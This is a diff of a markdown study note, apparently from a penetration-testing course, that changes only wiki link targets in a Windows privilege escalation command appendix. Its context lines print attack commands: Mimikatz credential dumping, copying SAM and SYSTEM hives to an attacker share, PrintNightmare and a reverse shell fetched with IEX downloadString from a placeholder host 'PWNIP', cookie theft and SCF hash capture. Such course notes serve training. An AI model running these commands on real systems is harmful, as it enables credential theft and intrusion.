@@ -1,6 +1,6 @@
 # Windows Privilege Escalation, Command Appendix
 
-Part of [[COMMAND APPENDIX]]. Exact syntax for Module 17 techniques. Phase-by-phase methodology: [[Windows Methodology#Phase 3: Privilege Escalation|Windows Methodology Phase 3]]. "I found X, what do I try": [[Windows Privilege Escalation (Decision Tree)]]. Full technique writeups with lab walkthroughs: [[Windows Privilege Escalation]].
+Part of [[COMMAND APPENDIX]]. Exact syntax for Module 17 techniques. Phase-by-phase methodology: [[Windows Methodology#Phase 3: Privilege Escalation|Windows Methodology Phase 3]]. "I found X, what do I try": [[Windows Privilege Escalation (Decision Tree)]]. Full technique writeups with lab walkthroughs: [[17. Windows Privilege Escalation|Windows Privilege Escalation]].
 
 ---
 
@@ -341,7 +341,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections | Where-
 
 Key fields: `PathConditions` = the blocked path, `Action = Deny` = blocked, `UserOrGroupSid = S-1-1-0` = applies to Everyone.
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.1. Situational Awareness|WPE.1]].
+See [[17. Windows Privilege Escalation|WPE.1]].
 
 #### Tags: #AppLocker #Enumeration #WindowsPrivesc
 
@@ -361,7 +361,7 @@ accesschk.exe -accepteula -w \pipe\SQLLocal\SQLEXPRESS01 -v
 :: FILE_ALL_ACCESS → full control
 ```
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.3. Communication with Processes (Named Pipes)|WPE.3]].
+See [[17. Windows Privilege Escalation|WPE.3]].
 
 #### Tags: #NamedPipe #AccessChk #WindowsPrivesc
 
@@ -389,7 +389,7 @@ sekurlsa::logonpasswords
 :: Look for: * NTLM : <hash> under each user's entry
 ```
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.5. SeDebugPrivilege|WPE.5]], [[Password Attacks#Mimikatz|Mimikatz appendix]].
+See [[17. Windows Privilege Escalation|WPE.5]], [[16. Password Attacks#Mimikatz|Mimikatz appendix]].
 
 #### Tags: #SeDebugPrivilege #lsass #Mimikatz #CredentialDump #WindowsPrivesc
 
@@ -415,7 +415,7 @@ cat 'C:\path\to\file.txt'
 
 High-value targets: `C:\Windows\System32\config\SAM`, `C:\Windows\System32\config\SYSTEM`, any protected file.
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.6. SeTakeOwnershipPrivilege|WPE.6]].
+See [[17. Windows Privilege Escalation|WPE.6]].
 
 #### Tags: #SeTakeOwnershipPrivilege #takeown #icacls #WindowsPrivesc
 
@@ -438,7 +438,7 @@ ExploitCapcom.exe
 :: A new CMD window opens as SYSTEM
 ```
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.10. Print Operators (SeLoadDriverPrivilege)|WPE.10]].
+See [[17. Windows Privilege Escalation|WPE.10]].
 
 #### Tags: #SeLoadDriverPrivilege #PrintOperators #Capcom #EoPLoadDriver #WindowsPrivesc
 
@@ -462,7 +462,7 @@ wevtutil qe Security /rd:true /f:text /q:"*[System[EventID=4688]]" | Select-Stri
 
 Look for: `net use /user:<user> <pass>`, `cmdkey /add: /user: /pass:`, `runas /user: ...`.
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.8. Event Log Readers|WPE.8]].
+See [[17. Windows Privilege Escalation|WPE.8]].
 
 #### Tags: #EventLogReaders #wevtutil #CredentialHunting #WindowsPrivesc
 
@@ -491,7 +491,7 @@ net group "Domain Admins" /dom
 
 Then re-authenticate (sign out + RDP back in) to get the new group token.
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.9. DnsAdmins Group|WPE.9]].
+See [[17. Windows Privilege Escalation|WPE.9]].
 
 #### Tags: #DnsAdmins #dnscmd #DLLInjection #WindowsPrivesc
 
@@ -516,7 +516,7 @@ net localgroup Administrators
 :: Step 5: sign out and reconnect — now have local admin token
 ```
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.11. Server Operators|WPE.11]].
+See [[17. Windows Privilege Escalation|WPE.11]].
 
 #### Tags: #ServerOperators #ServiceConfigHijack #WindowsPrivesc
 
@@ -552,7 +552,7 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.16. Credential Hunting|WPE.16]], [[Windows Privilege Escalation (HTB Supplementary)#WPE.17. Other Files (Sticky Notes, plum.sqlite)|WPE.17]], [[Windows Privilege Escalation (HTB Supplementary)#WPE.22. Miscellaneous Techniques|WPE.22]].
+See [[17. Windows Privilege Escalation|WPE.16]], [[17. Windows Privilege Escalation|WPE.17]], [[17. Windows Privilege Escalation|WPE.22]].
 
 #### Tags: #CredentialHunting #findstr #StickyNotes #unattendxml #WindowsPrivesc
 
@@ -573,7 +573,7 @@ Invoke-SessionGopher -Target <hostname>
 # For local only: Invoke-SessionGopher -Thorough
 ```
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.18. Further Credential Theft|WPE.18]].
+See [[17. Windows Privilege Escalation|WPE.18]].
 
 #### Tags: #LaZagne #SharpChrome #SessionGopher #CredentialDump #WindowsPrivesc
 
@@ -597,7 +597,7 @@ python3 mremoteng_decrypt.py -s "<base64-blob>" -p "<masterpassword>"
 
 Source: `https://github.com/haseebT/mRemoteNG-Decrypt`
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.21. Pillaging|WPE.21]].
+See [[17. Windows Privilege Escalation|WPE.21]].
 
 #### Tags: #mRemoteNG #CredentialDecrypt #Pillaging #WindowsPrivesc
 
@@ -620,7 +620,7 @@ Then in the victim's browser: Cookie-Editor extension → find the cookie by nam
 
 Source: `https://github.com/juliourena/plaintext/blob/master/Scripts/cookieextractor.py`
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.21. Pillaging|WPE.21]].
+See [[17. Windows Privilege Escalation|WPE.21]].
 
 #### Tags: #CookieTheft #Firefox #SessionHijacking #Pillaging #WindowsPrivesc
 
@@ -646,7 +646,7 @@ copy C:\Users\<user>\Restore\C\Windows\System32\config\SYSTEM \\PWNIP\share\
 impacket-secretsdump -sam SAM -system SYSTEM local
 ```
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.21. Pillaging|WPE.21]].
+See [[17. Windows Privilege Escalation|WPE.21]].
 
 #### Tags: #Restic #BackupExtraction #SecretsDump #Pillaging #WindowsPrivesc
 
@@ -673,7 +673,7 @@ hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
 Key: `@` prefix sorts the file first alphabetically so it loads the moment the folder is opened in Explorer. The NTLMv2 hash captures the opener's credentials.
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.20. Interacting with Users (SCF File Attack)|WPE.20]], [[Secrets & Credentials#Responder|Responder appendix]].
+See [[17. Windows Privilege Escalation|WPE.20]], [[Password Attacks#Responder (Net-NTLMv2 capture)|Responder appendix]].
 
 #### Tags: #SCFAttack #Responder #NetNTLMv2 #UserInteraction #WindowsPrivesc
 
@@ -695,7 +695,7 @@ smbclient -U administrator '\\STMIP\C$' --pw-nt-hash
 # Enter NTLM hash as password (NT portion only, not full string)
 ```
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.14. Kernel Exploits (HiveNightmare / CVE-2021-36934)|WPE.14]].
+See [[17. Windows Privilege Escalation|WPE.14]].
 
 #### Tags: #HiveNightmare #CVE202136934 #SeriousSAM #KernelExploit #WindowsPrivesc
 
@@ -719,7 +719,7 @@ IEX(New-Object Net.Webclient).downloadString('http://PWNIP:8080/CVE-2021-1675.ps
 
 Also works via authenticated SMB as a domain or local user with a Spooler service.
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.25. Skills Assessment Part I|WPE.25]].
+See [[17. Windows Privilege Escalation|WPE.25]].
 
 #### Tags: #PrintNightmare #CVE20211675 #SpoolerAbuse #WindowsPrivesc
 
@@ -752,7 +752,7 @@ Key old-OS exploits:
 | MS16-032 | 2016-0099 | Win 7-10 | Invoke-MS16-032.ps1 (GitHub) |
 | CVE-2021-36934 | HiveNightmare | Win10 1809-21H1 | CVE-2021-36934.exe |
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.23. Windows Server (Old OS)|WPE.23]], [[Windows Privilege Escalation (HTB Supplementary)#WPE.24. Windows Desktop (Old OS)|WPE.24]].
+See [[17. Windows Privilege Escalation|WPE.23]], [[17. Windows Privilege Escalation|WPE.24]].
 
 #### Tags: #Sherlock #WindowsExploitSuggester #OldOS #MS10092 #MS16032 #WindowsPrivesc
 
@@ -774,7 +774,7 @@ hashcat -m 1000 <ntlm_hash> /usr/share/wordlists/rockyou.txt
 
 Alternative when you have SYSTEM meterpreter: `hashdump` built-in.
 
-See [[Windows Privilege Escalation (HTB Supplementary)#WPE.26. Skills Assessment Part II|WPE.26]], [[Password Attacks#SAM offline dump|SAM offline dump]].
+See [[17. Windows Privilege Escalation|WPE.26]], [[16. Password Attacks#SAM offline dump|SAM offline dump]].
 
 #### Tags: #PwDump8 #HashDump #LocalHashes #WindowsPrivesc
 
@@ -810,7 +810,7 @@ net localgroup administrators <USERNAME> /add
 - Add an SSH authorized_keys entry for persistence
 - Execute a reverse shell: `cmd /c powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://PWNIP/shell.ps1')"`
 
-See [[Attacking Enterprise Networks (HTB Supplementary)#AEN.8. Lateral Movement|AEN.8 Q3]] for the full example.
+See [[27. Assembling the Pieces|AEN.8 Q3]] for the full example.
 
 #### Tags: #SysaxAutomation #FileTriggeredTask #WindowsPrivesc #ScheduledTasks #HTBSupplementary
 
